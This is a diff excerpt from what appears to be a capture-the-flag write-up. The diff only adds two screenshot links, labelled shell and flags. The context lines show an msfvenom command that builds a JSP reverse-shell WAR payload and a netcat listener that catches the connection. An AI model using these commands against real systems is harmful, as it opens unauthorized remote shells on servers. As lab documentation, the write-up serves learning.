@@ -78,4 +78,11 @@ This is our point of entry to the system. Back on my console I created a war fil
 the command I ran ```msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f <File_extension> -o <file_output.war>```
 I then had my payload ready to get uploaded on the target application with a listener that I had ready to receive connection from our targer after we have executed tha file that we uploaded on the server. the command was ``nc -lnvp <Port>``.
 
+![shell](https://user-images.githubusercontent.com/61636217/175169884-bacaa480-f6a3-480a-96d8-db75e03d506a.png)
+
+
+
+
+![flags](https://user-images.githubusercontent.com/61636217/175169915-39c55c4d-b7a1-408e-926f-4c42c5990559.png)
+
 
